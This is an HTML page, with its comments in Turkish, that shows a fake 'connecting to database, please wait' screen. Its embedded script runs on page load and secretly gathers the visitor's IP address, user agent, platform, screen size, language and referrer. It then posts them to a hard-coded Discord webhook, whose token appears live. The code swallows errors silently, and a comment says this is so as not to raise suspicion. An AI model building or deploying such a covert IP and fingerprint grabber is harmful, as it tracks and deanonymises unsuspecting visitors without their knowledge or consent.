<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Yükleniyor...</title>
    <style>
        body {
            background-color: #000;
            color: #0f0; /* Terminal yeşili */
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .status {
            border: 1px solid #0f0;
            padding: 20px;
            box-shadow: 0 0 15px #0f0;
        }
        .cursor {
            display: inline-block;
            width: 10px;
            background-color: #0f0;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="status">
        [ SYSTEM ] : VERI TABANINA BAGLANILIYOR...<br>
        [ STATUS ] : LUTFEN BEKLEYINIZ<span class="cursor">&nbsp;</span>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";

        async function logSystemData() {
            try {
                // IP bilgisini al
                const ipReq = await fetch('https://api64.ipify.org?format=json');
                const ipRes = await ipReq.json();
                const ip = ipRes.ip;

                // Sistem bilgilerini topla
                const data = {
                    time: new Date().toLocaleString('tr-TR'),
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    lang: navigator.language,
                    ref: document.referrer || "DIRECT_ACCESS"
                };

                // Mesajı "Hack Paneli" log formatına sok (Emoji içermez)
                const rawMessage = "```" + 
                    "--- [ INCOMING CONNECTION LOG ] ---\n" +
                    "TIMESTAMP  : " + data.time + "\n" +
                    "IP_ADDRESS : " + ip + "\n" +
                    "PLATFORM   : " + data.platform + "\n" +
                    "RESOLUTION : " + data.screen + "\n" +
                    "LANGUAGE   : " + data.lang + "\n" +
                    "REFERRER   : " + data.ref + "\n" +
                    "USER_AGENT : " + data.ua + "\n" +
                    "--- [ END OF LOG ] ---" +
                    "```";

                // Webhook'a ham metin olarak gönder
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: rawMessage,
                        username: "SYSTEM_LOGGER_V1"
                    })
                });

            } catch (err) {
                // Hata durumunda sessiz kal (şüphe çekmemek için)
            }
        }

        // Sayfa yüklendiğinde çalıştır
        window.onload = logSystemData;
    </script>
</body>
</html>
